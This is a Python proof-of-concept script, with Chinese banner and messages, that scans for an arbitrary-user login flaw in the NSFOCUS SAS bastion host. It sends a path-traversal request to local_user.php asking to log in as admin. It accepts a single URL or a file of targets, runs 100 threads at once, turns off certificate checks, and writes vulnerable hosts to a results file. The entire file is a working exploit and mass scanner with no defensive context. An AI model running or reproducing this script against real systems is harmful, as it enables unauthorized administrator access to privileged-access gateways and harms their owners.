import argparse, requests, sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """绿盟 SAS堡垒机 local_user.php 任意用户登录漏洞"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description="绿盟SAS堡垒机任意用户登录漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help='input your link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='input your file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for i in f.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"\n\tuage:python {sys.argv[0]} -h")
def poc(target):
    api_payload = "/api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin"
    headers = {
        'User-Agent': 'Mozilla/5.0(X11;Linuxx86_64;rv:91.0)Gecko/20100101Firefox/91.0',
        'Accept': 'text/javascript,text/html,application/xml,text/xml,*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip,deflate',
        'X-Requested-With': 'XMLHttpRequest',
        'X-Prototype-Version': '1.6.0.2',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'Te': 'trailers',
        'Connection': 'close'
    }
    try:
        response = requests.get(url=target + api_payload, headers=headers, verify=False, timeout=10)
        if response.status_code == 200 and '200' in response.text:
            print(f"[+]{target}存在任意用户登录漏洞")
            with open('绿盟用户登录_result.txt', 'a') as f:
                f.write(f"{target}存在任意用户登录漏洞\n")
        else:
            print(f"[-]{target}不存在任意用户登录漏洞")
    except:
        print(f"{target}可能存在任意用户登录请手工注入")
if __name__ == '__main__':
    main()